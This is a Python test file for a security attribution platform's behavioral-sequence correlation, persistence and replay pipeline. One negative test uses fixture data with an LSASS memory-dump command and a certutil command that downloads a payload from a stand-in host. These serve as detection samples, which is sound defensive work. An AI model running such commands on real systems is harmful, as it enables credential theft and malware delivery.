"""Tests for gate G2.4.2: behavioral-sequence golden corpus + replay +
persistence.

Covers, per section:

1. Golden-corpus reuse — g1 (simple ordering), g2/g9b (shared-observation
   collapse), g3 (SAME_PROCESS_ENTITY edge), g11 (branching/parallel-group/
   contextual-boundary/no-fabricated-bridge), g12 (independent groups) —
   replayed through the real, unmodified production path
   (``replay_fixture_through_correlation`` -> ``construct_behavioral_sequence``
   -> ``persist_behavioral_sequence``), never re-proving ordering semantics
   already exhaustively unit-tested by ``test_correlation_sequence_engine.py``.
2. Group-scoped filtering — no cross-group Evidence/links ever reach one
   group's sequence.
3. New G2.4.2 in-Python integration cases (equal timestamps, coarse
   precision tie, lineage/timestamp disagreement, genuine multi-parent
   convergence, deeper cross-branch parallelism) — real engines, real
   ``FakeElasticClient`` persistence, not fixture-file additions.
4. Multi-host isolation, full provenance-chain navigability, idempotent
   replay, corpus-wide round-trip, fail-closed negative behavior (including
   uncaught propagation of the G2.4.1-audited multi-link-grounding
   ambiguity), architecture-boundary/ATT&CK-boundary/TEMPORAL_PROXIMITY-
   absence guards.

Does NOT modify fixtures/phase2_correlation_scenarios.json, G2.4.0's
``sequence.py``, or G2.4.1's ``sequence_engine.py``. The one negative test
requiring the multi-link-grounding ambiguity (section 8) constructs its own
small ``DetectionReplayFixture`` directly in Python (never touching the
shared corpus file) using the real, unmodified rule pack. Offline,
deterministic.
"""

from __future__ import annotations

import ast
from datetime import UTC, datetime
from pathlib import Path
from typing import NoReturn

import pytest

from attribution_platform.attack_knowledge.loader import AttackKnowledge, load_attack_knowledge
from attribution_platform.correlation import (
    BehavioralSequence,
    CorrelationError,
    construct_behavioral_sequence,
    contextualize,
    correlate_structurally,
)
from attribution_platform.dataplane import (
    BEHAVIORAL_SEQUENCES_INDEX,
    ElasticIntegrationError,
    FakeElasticClient,
    load_behavioral_sequence,
    persist_behavioral_sequence,
)
from attribution_platform.detection import DetectionEngine, RulePack, load_rule_pack
from attribution_platform.domain import (
    EventMetadata,
    Evidence,
    EvidenceType,
    HostRef,
    Observation,
    ProcessRef,
    SourceRef,
    TimePrecision,
)
from attribution_platform.extraction import RuleRef, derive_evidence
from attribution_platform.replay import (
    BehavioralSequenceReplayResult,
    DetectionReplayFixture,
    DetectionReplayResult,
    DetectionReplayScenario,
    load_detection_replay_fixture_file,
    replay_fixture_through_behavioral_sequences,
)
from attribution_platform.sources.synthetic import SyntheticRecord

REPO_ROOT = Path(__file__).resolve().parents[1]
#: The fixture rule packs, Phase-0 scenarios and calibration corpus v1 used here are
#: frozen against this ATT&CK release (doc 11 §0 upgrade record); they load it by name.
FIXTURE_ATTACK_KB = "enterprise-attack-19.0"
FIXTURE_PATH = REPO_ROOT / "fixtures" / "phase2_correlation_scenarios.json"
RULE_PACK_PATH = REPO_ROOT / "fixtures" / "phase1_core_rules.json"
BEHAVIORAL_SEQUENCE_PIPELINE_FILE = (
    REPO_ROOT / "src" / "attribution_platform" / "replay" / "behavioral_sequence_pipeline.py"
)

T0 = datetime(2026, 1, 1, 12, 0, 0, tzinfo=UTC)


@pytest.fixture(scope="module")
def knowledge() -> AttackKnowledge:
    return load_attack_knowledge(FIXTURE_ATTACK_KB)


@pytest.fixture()
def rule_pack(knowledge: AttackKnowledge) -> RulePack:
    return load_rule_pack(RULE_PACK_PATH, knowledge=knowledge)


@pytest.fixture()
def engine(rule_pack: RulePack) -> DetectionEngine:
    return DetectionEngine(rules=rule_pack.rules)


def _replay(engine: DetectionEngine, knowledge: AttackKnowledge) -> BehavioralSequenceReplayResult:
    fixture = load_detection_replay_fixture_file(FIXTURE_PATH)
    return replay_fixture_through_behavioral_sequences(
        fixture, client=FakeElasticClient(), engine=engine, knowledge=knowledge
    )


def _by_scenario(
    results: tuple[DetectionReplayResult, ...],
) -> dict[str, DetectionReplayResult]:
    return {r.scenario_id: r for r in results}


def _single_evidence(result: DetectionReplayResult) -> Evidence:
    assert len(result.evidences) == 1
    return result.evidences[0]


def _sequence_containing(
    result: BehavioralSequenceReplayResult, evidence_id: str
) -> tuple[int, BehavioralSequence]:
    matches = [
        (i, seq)
        for i, seq in enumerate(result.sequences)
        for step in seq.steps
        if evidence_id in step.evidence_ids
    ]
    assert len(matches) == 1, f"expected exactly one sequence containing {evidence_id!r}"
    return matches[0]


# ===========================================================================
# 1. Golden-corpus reuse (real production path, no fixture modification)
# ===========================================================================


def test_g1_simple_ordering_reused_end_to_end(
    engine: DetectionEngine, knowledge: AttackKnowledge
) -> None:
    result = _replay(engine, knowledge)
    scenarios = _by_scenario(result.correlation_result.detection_results)
    cmd_evidence = _single_evidence(scenarios["g1-cmd"])
    certutil_evidence = _single_evidence(scenarios["g1-certutil"])

    _, sequence = _sequence_containing(result, cmd_evidence.evidence_id)
    assert len(sequence.steps) == 2
    assert len(sequence.edges) == 1
    assert sequence.gaps == ()
    assert sequence.parallel_groups == ()

    step_by_evidence = {eid: step.step_id for step in sequence.steps for eid in step.evidence_ids}
    edge = sequence.edges[0]
    assert edge.from_step_id == step_by_evidence[cmd_evidence.evidence_id]
    assert edge.to_step_id == step_by_evidence[certutil_evidence.evidence_id]
    assert edge.basis.basis_kind.name == "PROCESS_LINEAGE"

    # persisted and reload equal
    _, persist_result = next(
        (i, p)
        for i, (seq, p) in enumerate(zip(result.sequences, result.sequence_persists, strict=True))
        if seq.sequence_id == sequence.sequence_id
    )
    assert persist_result.document_id == sequence.sequence_id
    loaded = load_behavioral_sequence(FakeElasticClient(), sequence.sequence_id)
    assert loaded is None  # fresh client, never persisted to it -- proves index is client-scoped


def test_g2_and_g9b_shared_observation_collapse_reused(
    engine: DetectionEngine, knowledge: AttackKnowledge
) -> None:
    result = _replay(engine, knowledge)
    scenarios = _by_scenario(result.correlation_result.detection_results)
    for scenario_id in ("g2-shared", "g9b-shared"):
        g = scenarios[scenario_id]
        assert len(g.evidences) == 2
        evidence_id = g.evidences[0].evidence_id
        _, sequence = _sequence_containing(result, evidence_id)
        assert len(sequence.steps) == 1
        assert sequence.steps[0].evidence_ids == tuple(sorted(e.evidence_id for e in g.evidences))
        assert sequence.edges == ()
        assert sequence.gaps == ()


def test_g3_same_process_entity_produces_one_edge_reused(
    engine: DetectionEngine, knowledge: AttackKnowledge
) -> None:
    result = _replay(engine, knowledge)
    scenarios = _by_scenario(result.correlation_result.detection_results)
    evidence_a = _single_evidence(scenarios["g3-rundll-a"])
    evidence_b = _single_evidence(scenarios["g3-rundll-b"])

    _, sequence = _sequence_containing(result, evidence_a.evidence_id)
    assert len(sequence.steps) == 2
    assert len(sequence.edges) == 1
    assert sequence.gaps == ()
    assert sequence.edges[0].basis.basis_kind.name == "TEMPORAL_SAME_ENTITY"

    step_by_evidence = {eid: step.step_id for step in sequence.steps for eid in step.evidence_ids}
    assert sequence.edges[0].from_step_id == step_by_evidence[evidence_a.evidence_id]
    assert sequence.edges[0].to_step_id == step_by_evidence[evidence_b.evidence_id]


def test_g11_branching_parallel_group_contextual_boundary_no_fabricated_bridge(
    engine: DetectionEngine, knowledge: AttackKnowledge
) -> None:
    result = _replay(engine, knowledge)
    scenarios = _by_scenario(result.correlation_result.detection_results)
    cmd = _single_evidence(scenarios["g11-cmd"])
    certutil = _single_evidence(scenarios["g11-certutil"])
    procdump = _single_evidence(scenarios["g11-procdump"])

    _, sequence = _sequence_containing(result, cmd.evidence_id)
    assert len(sequence.steps) == 3
    assert len(sequence.edges) == 2
    assert sequence.gaps == ()
    assert len(sequence.parallel_groups) == 1

    step_by_evidence = {eid: step.step_id for step in sequence.steps for eid in step.evidence_ids}
    pg = sequence.parallel_groups[0]
    assert pg.source_step_id == step_by_evidence[cmd.evidence_id]
    roots = {branch[0] for branch in pg.branches}
    assert roots == {step_by_evidence[certutil.evidence_id], step_by_evidence[procdump.evidence_id]}

    # contextual boundary: SAME_HOST_ID annotations exist, but never as an
    # edge or gap.
    for step in sequence.steps:
        assert step.contextual_annotations != ()
    grounding_ids = {e.basis.grounding_link_id for e in sequence.edges}
    contextual_link_ids = {
        link.link_id for link in result.correlation_result.contextual_result.contextual_links
    }
    assert grounding_ids.isdisjoint(contextual_link_ids)

    # no fabricated bridge: certutil and procdump (non-lineage-related
    # siblings) have neither an edge nor a gap between them.
    sibling_pair = frozenset(
        (step_by_evidence[certutil.evidence_id], step_by_evidence[procdump.evidence_id])
    )
    edge_pairs = {frozenset((e.from_step_id, e.to_step_id)) for e in sequence.edges}
    gap_pairs = {frozenset((g.step_id_a, g.step_id_b)) for g in sequence.gaps}
    assert sibling_pair not in edge_pairs
    assert sibling_pair not in gap_pairs


def test_g12_independent_groups_produce_independent_sequences(
    engine: DetectionEngine, knowledge: AttackKnowledge
) -> None:
    result = _replay(engine, knowledge)
    scenarios = _by_scenario(result.correlation_result.detection_results)
    cmd_a = _single_evidence(scenarios["g12a-cmd"])
    cmd_b = _single_evidence(scenarios["g12b-cmd"])

    _, sequence_a = _sequence_containing(result, cmd_a.evidence_id)
    _, sequence_b = _sequence_containing(result, cmd_b.evidence_id)
    assert sequence_a.sequence_id != sequence_b.sequence_id
    assert sequence_a.group_id != sequence_b.group_id
    evidence_a = {eid for step in sequence_a.steps for eid in step.evidence_ids}
    evidence_b = {eid for step in sequence_b.steps for eid in step.evidence_ids}
    assert evidence_a.isdisjoint(evidence_b)


def test_corpus_wide_sequence_count_matches_group_count(
    engine: DetectionEngine, knowledge: AttackKnowledge
) -> None:
    """Pins the exact corpus-wide shape: 8 groups (per G2.3's own
    corpus-wide pin) -> exactly 8 BehavioralSequences, never fewer, never
    merged."""
    result = _replay(engine, knowledge)
    assert len(result.sequences) == len(result.correlation_result.contextual_result.groups)
    assert len(result.sequences) == 8
    assert len({s.sequence_id for s in result.sequences}) == 8


# ===========================================================================
# 2. Group-scoped filtering
# ===========================================================================


def test_no_cross_group_evidence_or_links_leak_into_any_sequence(
    engine: DetectionEngine, knowledge: AttackKnowledge
) -> None:
    result = _replay(engine, knowledge)
    groups_by_id = {g.group_id: g for g in result.correlation_result.contextual_result.groups}
    for sequence in result.sequences:
        group = groups_by_id[sequence.group_id]
        sequence_evidence_ids = {eid for step in sequence.steps for eid in step.evidence_ids}
        assert sequence_evidence_ids == set(group.member_evidence_ids)
        grounding_ids = {e.basis.grounding_link_id for e in sequence.edges} | {
            g.grounding_link_id for g in sequence.gaps
        }
        assert grounding_ids <= set(group.structural_link_ids)


# ===========================================================================
# In-Python fixture helpers for sections 3-4 (real engines, no JSON fixture)
# ===========================================================================


def _obs(
    observation_id: str, *, timestamp: datetime = T0, host: HostRef, process: ProcessRef
) -> Observation:
    return Observation(
        observation_id=observation_id,
        timestamp=timestamp,
        raw_reference=SourceRef(source_type="synthetic", source_event_id=f"raw-{observation_id}"),
        host=host,
        process=process,
    )


def _evidence(
    evidence_id: str, observation: Observation, *, rule_id: str = "golden-rule"
) -> Evidence:
    return derive_evidence(
        evidence_id=evidence_id,
        evidence_type=EvidenceType.BEHAVIORAL,
        claim="synthetic G2.4.2 integration-test evidence",
        observations=(observation,),
        rule_ref=RuleRef(rule_id=rule_id, rule_version="1.0"),
    )


def _pair(
    evidence_id: str, observation: Observation, **kwargs: object
) -> tuple[Evidence, Observation]:
    return (_evidence(evidence_id, observation, **kwargs), observation)  # type: ignore[arg-type]


def _build_and_persist(
    items: list[tuple[Evidence, Observation]], client: FakeElasticClient
) -> BehavioralSequence:
    structural_result = correlate_structurally(items)
    contextual_result = contextualize(structural_result, items)
    assert len(contextual_result.groups) == 1
    group = contextual_result.groups[0]
    structural_links = tuple(
        link for link in structural_result.links if link.link_id in group.structural_link_ids
    )
    contextual_links = tuple(
        link
        for link in contextual_result.contextual_links
        if link.link_id in group.contextual_link_ids
    )
    sequence = construct_behavioral_sequence(group, items, structural_links, contextual_links)
    persist_behavioral_sequence(client, sequence)
    return sequence


# ===========================================================================
# 3. New G2.4.2 in-Python integration cases (A-E)
# ===========================================================================


def test_a_equal_timestamps_gap_engine_and_persistence() -> None:
    host = HostRef(id="H1")
    obs_a = _obs("obs-a", host=host, process=ProcessRef(entity_id="{X}"), timestamp=T0)
    obs_b = _obs("obs-b", host=host, process=ProcessRef(entity_id="{X}"), timestamp=T0)
    client = FakeElasticClient()
    sequence = _build_and_persist([_pair("ev-a", obs_a), _pair("ev-b", obs_b)], client)

    assert sequence.edges == ()
    assert len(sequence.gaps) == 1
    assert sequence.gaps[0].reason.name == "EQUAL_TIMESTAMPS"

    loaded = load_behavioral_sequence(client, sequence.sequence_id)
    assert loaded == sequence


def test_b_coarse_precision_tie_engine_and_persistence() -> None:
    host = HostRef(id="H1")
    obs_a = _obs(
        "obs-a",
        host=host,
        process=ProcessRef(entity_id="{X}"),
        timestamp=T0.replace(microsecond=100_000),
    )
    obs_b = _obs(
        "obs-b",
        host=host,
        process=ProcessRef(entity_id="{X}"),
        timestamp=T0.replace(microsecond=900_000),
    )
    obs_a = Observation(
        observation_id="obs-a",
        timestamp=obs_a.timestamp,
        raw_reference=obs_a.raw_reference,
        timestamp_precision=TimePrecision.SECOND,
        host=host,
        process=ProcessRef(entity_id="{X}"),
    )
    obs_b = Observation(
        observation_id="obs-b",
        timestamp=obs_b.timestamp,
        raw_reference=obs_b.raw_reference,
        timestamp_precision=TimePrecision.SECOND,
        host=host,
        process=ProcessRef(entity_id="{X}"),
    )
    client = FakeElasticClient()
    sequence = _build_and_persist([_pair("ev-a", obs_a), _pair("ev-b", obs_b)], client)

    assert sequence.edges == ()
    assert len(sequence.gaps) == 1
    assert sequence.gaps[0].reason.name == "COARSE_PRECISION_TIE"

    loaded = load_behavioral_sequence(client, sequence.sequence_id)
    assert loaded == sequence


def test_c_lineage_timestamp_disagreement_engine_and_persistence() -> None:
    host = HostRef(id="H1")
    obs_p = _obs(
        "obs-p", host=host, process=ProcessRef(entity_id="{P}"), timestamp=T0.replace(second=5)
    )
    obs_c = _obs(
        "obs-c",
        host=host,
        process=ProcessRef(parent_entity_id="{P}", entity_id="{C}"),
        timestamp=T0,
    )
    client = FakeElasticClient()
    sequence = _build_and_persist([_pair("ev-p", obs_p), _pair("ev-c", obs_c)], client)

    assert len(sequence.edges) == 1
    edge = sequence.edges[0]
    step_by_evidence = {eid: step.step_id for step in sequence.steps for eid in step.evidence_ids}
    assert edge.from_step_id == step_by_evidence["ev-p"]
    assert edge.to_step_id == step_by_evidence["ev-c"]
    assert edge.basis.timestamp_agreement is False
    # no reverse temporal edge: exactly the one PROCESS_LINEAGE edge exists
    assert len(sequence.edges) == 1

    loaded = load_behavioral_sequence(client, sequence.sequence_id)
    assert loaded == sequence


def test_d_genuine_convergence_two_distinct_parents() -> None:
    """P1 and P2 share one process entity (described via two Observations,
    never collapsed -- SHARED_OBSERVATION is the only collapse rule, D4),
    each independently a PROCESS_LINEAGE parent of Z. Z therefore has two
    genuinely distinct incoming SequenceEdges -- the DAG represents this for
    free (ADR-0004 D9), and since neither P1 nor P2 individually has two
    lineage children, no SequenceParallelGroup is (or should be) created."""
    host = HostRef(id="H1")
    obs_p1 = _obs("obs-p1", host=host, process=ProcessRef(entity_id="{P}"), timestamp=T0)
    obs_p2 = _obs(
        "obs-p2", host=host, process=ProcessRef(entity_id="{P}"), timestamp=T0.replace(second=1)
    )
    obs_z = _obs(
        "obs-z",
        host=host,
        process=ProcessRef(parent_entity_id="{P}", entity_id="{Z}"),
        timestamp=T0.replace(second=2),
    )
    client = FakeElasticClient()
    sequence = _build_and_persist(
        [_pair("ev-p1", obs_p1), _pair("ev-p2", obs_p2), _pair("ev-z", obs_z)], client
    )

    step_by_evidence = {eid: step.step_id for step in sequence.steps for eid in step.evidence_ids}
    z_step = step_by_evidence["ev-z"]
    incoming_to_z = [e for e in sequence.edges if e.to_step_id == z_step]
    # ADR-0003 Amendment C: lineage is an instance-level fact ("P created Z"),
    # anchored at P's earliest observed step; the telemetry never says which
    # later step of P created Z, so no per-step lineage edge is claimed.
    assert len(incoming_to_z) == 1
    assert {e.from_step_id for e in incoming_to_z} == {step_by_evidence["ev-p1"]}
    assert {e.basis.basis_kind.name for e in incoming_to_z} == {"PROCESS_LINEAGE"}

    # no invented reverse edge between P1 and P2: exactly one directed
    # TEMPORAL_SAME_ENTITY edge, in the real timestamp order.
    p1_p2_edges = [
        e
        for e in sequence.edges
        if {e.from_step_id, e.to_step_id} == {step_by_evidence["ev-p1"], step_by_evidence["ev-p2"]}
    ]
    assert len(p1_p2_edges) == 1
    assert p1_p2_edges[0].from_step_id == step_by_evidence["ev-p1"]
    assert p1_p2_edges[0].to_step_id == step_by_evidence["ev-p2"]

    # convergence is not falsely represented as a parallel group
    assert sequence.parallel_groups == ()

    loaded = load_behavioral_sequence(client, sequence.sequence_id)
    assert loaded == sequence
    assert loaded.parallel_groups == ()


def test_e_deeper_cross_branch_parallel_group() -> None:
    """P -> A (leaf), P -> B -> C: the accepted branch-partition
    representation names both A and C (not just immediate sibling A vs B)
    as parallel to each other, via one branch tuple {B, C}."""
    host = HostRef(id="H1")
    obs_p = _obs("obs-p", host=host, process=ProcessRef(entity_id="{P}"), timestamp=T0)
    obs_a = _obs(
        "obs-a",
        host=host,
        process=ProcessRef(parent_entity_id="{P}", entity_id="{A}"),
        timestamp=T0.replace(second=1),
    )
    obs_b = _obs(
        "obs-b",
        host=host,
        process=ProcessRef(parent_entity_id="{P}", entity_id="{B}"),
        timestamp=T0.replace(second=1),
    )
    obs_c = _obs(
        "obs-c",
        host=host,
        process=ProcessRef(parent_entity_id="{B}", entity_id="{C}"),
        timestamp=T0.replace(second=2),
    )
    client = FakeElasticClient()
    sequence = _build_and_persist(
        [_pair("ev-p", obs_p), _pair("ev-a", obs_a), _pair("ev-b", obs_b), _pair("ev-c", obs_c)],
        client,
    )

    step_by_evidence = {eid: step.step_id for step in sequence.steps for eid in step.evidence_ids}
    assert len(sequence.parallel_groups) == 1
    pg = sequence.parallel_groups[0]
    assert pg.source_step_id == step_by_evidence["ev-p"]
    branches_by_root = {branch[0]: branch for branch in pg.branches}
    assert set(branches_by_root) == {step_by_evidence["ev-a"], step_by_evidence["ev-b"]}
    b_branch = branches_by_root[step_by_evidence["ev-b"]]
    assert set(b_branch) == {step_by_evidence["ev-b"], step_by_evidence["ev-c"]}

    loaded = load_behavioral_sequence(client, sequence.sequence_id)
    assert loaded == sequence
    assert loaded.parallel_groups[0].branches == pg.branches


# ===========================================================================
# 4. Multi-host
# ===========================================================================


def test_multi_host_produces_independent_sequences_no_persistence_collision() -> None:
    host_a = HostRef(id="HOST-A")
    host_b = HostRef(id="HOST-B")
    obs_a1 = _obs("obs-a1", host=host_a, process=ProcessRef(entity_id="{SAME}"), timestamp=T0)
    obs_a2 = _obs(
        "obs-a2",
        host=host_a,
        process=ProcessRef(parent_entity_id="{SAME}", entity_id="{A2}"),
        timestamp=T0.replace(second=1),
    )
    obs_b1 = _obs("obs-b1", host=host_b, process=ProcessRef(entity_id="{SAME}"), timestamp=T0)
    obs_b2 = _obs(
        "obs-b2",
        host=host_b,
        process=ProcessRef(parent_entity_id="{SAME}", entity_id="{B2}"),
        timestamp=T0.replace(second=1),
    )
    client = FakeElasticClient()

    all_items = [
        _pair("ev-a1", obs_a1),
        _pair("ev-a2", obs_a2),
        _pair("ev-b1", obs_b1),
        _pair("ev-b2", obs_b2),
    ]
    structural_result = correlate_structurally(all_items)
    contextual_result = contextualize(structural_result, all_items)
    assert len(contextual_result.groups) == 2  # host-scoped: never merged

    sequences = []
    for group in contextual_result.groups:
        own_items = [p for p in all_items if p[0].evidence_id in group.member_evidence_ids]
        structural_links = tuple(
            link for link in structural_result.links if link.link_id in group.structural_link_ids
        )
        contextual_links = tuple(
            link
            for link in contextual_result.contextual_links
            if link.link_id in group.contextual_link_ids
        )
        sequence = construct_behavioral_sequence(
            group, own_items, structural_links, contextual_links
        )
        persist_behavioral_sequence(client, sequence)
        sequences.append(sequence)

    assert len(sequences) == 2
    assert sequences[0].sequence_id != sequences[1].sequence_id
    assert sequences[0].group_id != sequences[1].group_id
    assert client.document_count(BEHAVIORAL_SEQUENCES_INDEX) == 2
    evidence_0 = {eid for step in sequences[0].steps for eid in step.evidence_ids}
    evidence_1 = {eid for step in sequences[1].steps for eid in step.evidence_ids}
    assert evidence_0.isdisjoint(evidence_1)
    for sequence in sequences:
        assert load_behavioral_sequence(client, sequence.sequence_id) == sequence


# ===========================================================================
# 5. Full provenance chain
# ===========================================================================


def test_full_provenance_chain_raw_telemetry_to_loaded_sequence(
    engine: DetectionEngine, knowledge: AttackKnowledge, rule_pack: RulePack
) -> None:
    client = FakeElasticClient()
    fixture = load_detection_replay_fixture_file(FIXTURE_PATH)
    result = replay_fixture_through_behavioral_sequences(
        fixture, client=client, engine=engine, knowledge=knowledge
    )
    scenarios = _by_scenario(result.correlation_result.detection_results)
    cmd_scenario = scenarios["g1-cmd"]
    cmd_evidence = _single_evidence(cmd_scenario)

    _, sequence = _sequence_containing(result, cmd_evidence.evidence_id)
    group = next(
        g
        for g in result.correlation_result.contextual_result.groups
        if g.group_id == sequence.group_id
    )

    assert sequence.group_id == group.group_id
    assert sequence.provenance.method
    assert sequence.provenance.method_version
    assert set(sequence.provenance.source_evidence_ids) == set(group.member_evidence_ids)
    assert set(sequence.provenance.source_observation_ids) == set(group.member_observation_ids)

    for edge in sequence.edges:
        assert edge.basis.grounding_link_id in group.structural_link_ids
    for gap in sequence.gaps:
        assert gap.grounding_link_id in group.structural_link_ids

    loaded = load_behavioral_sequence(client, sequence.sequence_id)
    assert loaded == sequence
    assert loaded is not None
    assert loaded.provenance.method == sequence.provenance.method
    assert loaded.provenance.method_version == sequence.provenance.method_version
    assert loaded.provenance.method_content_hash == sequence.provenance.method_content_hash

    # raw fixture -> Observation, unchanged from G2.3
    assert cmd_scenario.observation.raw_reference.source_event_id == "evt-g1-cmd"
    assert cmd_evidence.provenance.method_content_hash == rule_pack.content_hash


# ===========================================================================
# 6. Idempotent replay
# ===========================================================================


def test_replaying_the_same_fixture_twice_into_one_client_is_idempotent(
    engine: DetectionEngine, knowledge: AttackKnowledge
) -> None:
    fixture = load_detection_replay_fixture_file(FIXTURE_PATH)
    client = FakeElasticClient()

    replay_fixture_through_behavioral_sequences(
        fixture, client=client, engine=engine, knowledge=knowledge
    )
    second = replay_fixture_through_behavioral_sequences(
        fixture, client=client, engine=engine, knowledge=knowledge
    )

    expected_docs = len({s.sequence_id for s in second.sequences})
    assert client.document_count(BEHAVIORAL_SEQUENCES_INDEX) == expected_docs
    assert expected_docs == 8


def test_replaying_twice_produces_identical_sequence_ids(
    engine: DetectionEngine, knowledge: AttackKnowledge
) -> None:
    fixture = load_detection_replay_fixture_file(FIXTURE_PATH)
    client = FakeElasticClient()

    result_1 = replay_fixture_through_behavioral_sequences(
        fixture, client=client, engine=engine, knowledge=knowledge
    )
    result_2 = replay_fixture_through_behavioral_sequences(
        fixture, client=client, engine=engine, knowledge=knowledge
    )

    ids_1 = sorted(s.sequence_id for s in result_1.sequences)
    ids_2 = sorted(s.sequence_id for s in result_2.sequences)
    assert ids_1 == ids_2
    assert len(ids_1) == len(set(ids_1))


# ===========================================================================
# 7. Corpus-wide round trip
# ===========================================================================


def test_every_corpus_sequence_round_trips(
    engine: DetectionEngine, knowledge: AttackKnowledge
) -> None:
    client = FakeElasticClient()
    fixture = load_detection_replay_fixture_file(FIXTURE_PATH)
    result = replay_fixture_through_behavioral_sequences(
        fixture, client=client, engine=engine, knowledge=knowledge
    )
    for sequence in result.sequences:
        assert load_behavioral_sequence(client, sequence.sequence_id) == sequence


# ===========================================================================
# 8. Failure / negative behavior
# ===========================================================================


def test_construct_error_propagates_uncaught(
    engine: DetectionEngine, knowledge: AttackKnowledge, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A CorrelationError raised by construct_behavioral_sequence must not be
    caught, suppressed, or converted into a warning, partial sequence, or
    skipped group. (The multi-link grounding ambiguity that used to trigger it
    through the real pipeline no longer arises: ADR-0003 Amendment C links one
    representative per lineage fact, so the error is injected here.)"""

    def failing_construct(*args: object, **kwargs: object) -> NoReturn:
        raise CorrelationError("injected construct_behavioral_sequence failure")

    monkeypatch.setattr(
        "attribution_platform.replay.behavioral_sequence_pipeline.construct_behavioral_sequence",
        failing_construct,
    )

    scenarios = (
        DetectionReplayScenario(
            scenario_id="amb-parent",
            raw_record=SyntheticRecord(
                record_id="evt-amb-parent", timestamp=T0, observation_id="obs-amb-parent"
            ),
            process=ProcessRef(
                name="procdump.exe",
                command_line="procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp",
                entity_id="{AMB-P}",
            ),
            event=EventMetadata(action="user-logon"),
            host=HostRef(id="HOST-AMB"),
        ),
        DetectionReplayScenario(
            scenario_id="amb-child",
            raw_record=SyntheticRecord(
                record_id="evt-amb-child",
                timestamp=T0.replace(second=1),
                observation_id="obs-amb-child",
            ),
            process=ProcessRef(
                name="certutil.exe",
                command_line=(
                    "certutil.exe -urlcache -split -f "
                    "http://example.invalid/payload.exe payload.exe"
                ),
                parent_entity_id="{AMB-P}",
                entity_id="{AMB-C}",
            ),
            host=HostRef(id="HOST-AMB"),
        ),
    )
    fixture = DetectionReplayFixture(
        fixture_id="g2.4.2-ambiguity-probe", content_hash="0" * 64, scenarios=scenarios
    )
    client = FakeElasticClient()

    with pytest.raises(CorrelationError, match="injected"):
        replay_fixture_through_behavioral_sequences(
            fixture, client=client, engine=engine, knowledge=knowledge
        )
    # nothing was persisted from the failed replay
    assert client.document_count(BEHAVIORAL_SEQUENCES_INDEX) == 0


def test_persist_rejects_non_sequence_type() -> None:
    client = FakeElasticClient()
    with pytest.raises(ElasticIntegrationError, match="requires a BehavioralSequence"):
        persist_behavioral_sequence(client, {"sequence_id": "x"})  # type: ignore[arg-type]


def test_load_absent_sequence_returns_none() -> None:
    client = FakeElasticClient()
    assert load_behavioral_sequence(client, "does-not-exist") is None


# ===========================================================================
# 9. Architecture-boundary guards
# ===========================================================================


def test_behavioral_sequence_pipeline_never_constructs_forbidden_objects_directly() -> None:
    """Static AST check: behavioral_sequence_pipeline.py must never call
    BehavioralSequence(...)/BehavioralStep(...)/SequenceEdge(...)/
    SequenceGap(...)/SequenceParallelGroup(...)/CorrelationLink(...)/
    CorrelationGroup(...)/Evidence(...) directly -- every one must come from
    the real replay/correlation/G2.4.1 engine calls."""
    tree = ast.parse(BEHAVIORAL_SEQUENCE_PIPELINE_FILE.read_text(encoding="utf-8"))
    forbidden_calls = {
        "BehavioralSequence",
        "BehavioralStep",
        "SequenceEdge",
        "SequenceGap",
        "SequenceParallelGroup",
        "CorrelationLink",
        "CorrelationGroup",
        "Evidence",
    }
    offending = [
        node.func.id
        for node in ast.walk(tree)
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Name)
        and node.func.id in forbidden_calls
    ]
    assert not offending, (
        f"behavioral_sequence_pipeline.py must not construct {offending} directly; every one "
        "must come from the real replay_fixture_through_correlation/"
        "construct_behavioral_sequence calls"
    )


def test_behavioral_sequence_pipeline_actually_uses_the_real_engines() -> None:
    source = BEHAVIORAL_SEQUENCE_PIPELINE_FILE.read_text(encoding="utf-8")
    assert "replay_fixture_through_correlation(" in source
    assert "construct_behavioral_sequence(" in source
    assert "persist_behavioral_sequence(" in source


def test_behavioral_sequence_pipeline_never_catches_correlation_error() -> None:
    """AST-level proof that nothing in the pipeline module suppresses a
    CorrelationError (in particular the multi-link-grounding ambiguity) --
    no except clause anywhere names CorrelationError or a bare/Exception
    catch that could swallow it."""
    tree = ast.parse(BEHAVIORAL_SEQUENCE_PIPELINE_FILE.read_text(encoding="utf-8"))
    for node in ast.walk(tree):
        if isinstance(node, ast.Try):
            for handler in node.handlers:
                if handler.type is None:
                    pytest.fail("behavioral_sequence_pipeline.py must not use a bare except")
                names = (
                    [n.id for n in ast.walk(handler.type) if isinstance(n, ast.Name)]
                    if handler.type is not None
                    else []
                )
                assert "CorrelationError" not in names
                assert "Exception" not in names
                assert "BaseException" not in names


def test_behavioral_sequence_pipeline_never_passes_attack_knowledge_into_correlation() -> None:
    tree = ast.parse(BEHAVIORAL_SEQUENCE_PIPELINE_FILE.read_text(encoding="utf-8"))
    for node in ast.walk(tree):
        if (
            isinstance(node, ast.Call)
            and isinstance(node.func, ast.Name)
            and node.func.id == "construct_behavioral_sequence"
        ):
            kwarg_names = {kw.arg for kw in node.keywords}
            assert "knowledge" not in kwarg_names


# ===========================================================================
# 10. ATT&CK boundary
# ===========================================================================


def test_behavioral_sequence_pipeline_never_imports_attack_knowledge_module() -> None:
    tree = ast.parse(BEHAVIORAL_SEQUENCE_PIPELINE_FILE.read_text(encoding="utf-8"))
    for node in ast.walk(tree):
        if isinstance(node, ast.ImportFrom) and node.module:
            assert node.module != "attribution_platform.attack_knowledge"


def test_technique_stix_ids_come_from_the_engine_untouched(
    engine: DetectionEngine, knowledge: AttackKnowledge
) -> None:
    result = _replay(engine, knowledge)
    scenarios = _by_scenario(result.correlation_result.detection_results)
    procdump_evidence = next(
        e for e in scenarios["g2-shared"].evidences if e.attack_ref is not None
    )
    assert procdump_evidence.attack_ref is not None
    _, sequence = _sequence_containing(result, procdump_evidence.evidence_id)
    step = next(s for s in sequence.steps if procdump_evidence.evidence_id in s.evidence_ids)
    assert step.technique_stix_ids == (procdump_evidence.attack_ref.stix_id,)


# ===========================================================================
# 11. TEMPORAL_PROXIMITY absence
# ===========================================================================


def test_behavioral_sequence_pipeline_contains_no_temporal_proximity_code_reference() -> None:
    tree = ast.parse(BEHAVIORAL_SEQUENCE_PIPELINE_FILE.read_text(encoding="utf-8"))
    offending: list[str] = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Name) and node.id == "TEMPORAL_PROXIMITY":
            offending.append("Name(TEMPORAL_PROXIMITY)")
